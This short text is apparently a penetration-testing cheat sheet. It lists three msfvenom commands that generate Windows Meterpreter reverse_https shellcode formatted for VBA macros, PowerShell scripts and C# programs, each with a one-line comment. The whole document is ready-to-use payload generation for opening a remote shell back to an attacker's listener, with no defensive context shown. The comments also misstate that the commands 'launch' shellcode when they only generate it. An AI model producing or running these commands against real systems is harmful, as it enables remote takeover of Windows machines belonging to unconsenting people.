msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<LPORT> EXITFUNC=thread -f vbapplication

#This msfvenom command launch a shellcode on VBA application format.

msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1

# This msfvenom command launch a shellcode on PowerShell script application format.

msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f csharp

# This msfvenom command launch a shellcode on CSharp language format.